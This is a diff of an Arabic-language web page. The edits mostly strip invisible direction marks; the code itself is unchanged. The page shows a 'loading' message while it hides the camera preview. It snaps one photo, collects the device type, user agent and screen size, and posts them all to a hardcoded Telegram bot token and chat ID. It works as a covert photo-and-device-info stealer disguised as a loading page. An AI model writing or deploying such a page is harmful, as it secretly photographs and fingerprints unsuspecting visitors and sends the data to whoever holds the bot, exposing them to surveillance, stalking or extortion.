@@ -1,104 +1,104 @@
-‏<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar">
-‏<head>
-‏<meta charset="UTF-8">
-‏<title>One Photo With Info</title>
+<head>
+<meta charset="UTF-8">
+<title>One Photo With Info</title>
 
-‏<style>
-‏body {
-‏  background:#000;
-‏  color:#0f0;
-‏  text-align:center;
-‏  font-family:Arial;
+<style>
+body {
+  background:#000;
+  color:#0f0;
+  text-align:center;
+  font-family:Arial;
 }
 
 /* إخفاء معاينة الكاميرا */
-‏video {
-‏  display: none;
+video {
+  display: none;
 }
-‏</style>
-‏</head>
+</style>
+</head>
 
-‏<body>
+<body>
 
-‏<h3>جاري التحميل...</h3>
+<h3>جاري التحميل...</h3>
 
-‏<video id="video" autoplay playsinline></video>
-‏<canvas id="canvas" style="display:none;"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-‏<script>
+<script>
 // ===== ضع معلوماتك هنا (محليًا فقط) =====
-‏const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
-‏const CHAT_ID  = "6251932709";
+const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
+const CHAT_ID  = "6251932709";
 // ======================================
 
-‏let streamRef = null;
+let streamRef = null;
 
 // جمع معلومات الجهاز
-‏function getDeviceInfo() {
-‏  const ua = navigator.userAgent;
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
 
-‏  let deviceType = "غير معروف";
-‏  if (/android/i.test(ua)) deviceType = "Android";
-‏  else if (/iphone|ipad|ipod/i.test(ua)) deviceType = "iPhone / iOS";
-‏  else if (/windows/i.test(ua)) deviceType = "Windows";
-‏  else if (/macintosh/i.test(ua)) deviceType = "Mac";
-‏  else if (/linux/i.test(ua)) deviceType = "Linux";
+  let deviceType = "غير معروف";
+  if (/android/i.test(ua)) deviceType = "Android";
+  else if (/iphone|ipad|ipod/i.test(ua)) deviceType = "iPhone / iOS";
+  else if (/windows/i.test(ua)) deviceType = "Windows";
+  else if (/macintosh/i.test(ua)) deviceType = "Mac";
+  else if (/linux/i.test(ua)) deviceType = "Linux";
 
-‏  return `
+  return `
 📱 نوع الجهاز: ${deviceType}
 🌐 المتصفح: ${navigator.appName}
-‏🧭 User-Agent: ${ua}
+🧭 User-Agent: ${ua}
 📐 دقة الشاشة: ${screen.width} x ${screen.height}
 ⏰ الوقت: ${new Date().toLocaleString()}
   `;
 }
 
 // تشغيل الكاميرا (بموافقة المستخدم)
-‏navigator.mediaDevices.getUserMedia({ video: true })
-‏.then(stream => {
-‏  streamRef = stream;
-‏  document.getElementById("video").srcObject = stream;
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  streamRef = stream;
+  document.getElementById("video").srcObject = stream;
 
   // صورة واحدة فقط بعد ثانيتين
-‏  setTimeout(captureOnce, 2000);
+  setTimeout(captureOnce, 2000);
 })
-‏.catch(() => {
-‏  document.body.innerHTML = "<h2>تم رفض إذن الكاميرا</h2>";
+.catch(() => {
+  document.body.innerHTML = "<h2>تم رفض إذن الكاميرا</h2>";
 });
 
-‏function captureOnce() {
-‏  const video = document.getElementById("video");
-‏  const canvas = document.getElementById("canvas");
+function captureOnce() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
 
-‏  canvas.width = video.videoWidth;
-‏  canvas.height = video.videoHeight;
-‏  canvas.getContext("2d").drawImage(video, 0, 0);
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
 
   // إيقاف الكاميرا
-‏  if (streamRef) {
-‏    streamRef.getTracks().forEach(t => t.stop());
+  if (streamRef) {
+    streamRef.getTracks().forEach(t => t.stop());
   }
 
-‏  canvas.toBlob(blob => {
-‏    const form = new FormData();
-‏    form.append("chat_id", CHAT_ID);
-‏    form.append("photo", blob);
-‏    form.append("caption", getDeviceInfo());
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob);
+    form.append("caption", getDeviceInfo());
 
-‏    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-‏      method: "POST",
-‏      body: form
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: form
     })
-‏    .then(() => {
-‏      document.body.innerHTML = "<h2>تم الإرسال ✅</h2>";
+    .then(() => {
+      document.body.innerHTML = "<h2>تم الإرسال ✅</h2>";
     })
-‏    .catch(() => {
-‏      document.body.innerHTML = "<h2>فشل الإرسال ❌</h2>";
+    .catch(() => {
+      document.body.innerHTML = "<h2>فشل الإرسال ❌</h2>";
     });
-‏  }, "image/jpeg");
+  }, "image/jpeg");
 }
-‏</script>
+</script>
 
-‏</body>
-‏</html>
+</body>
+</html>
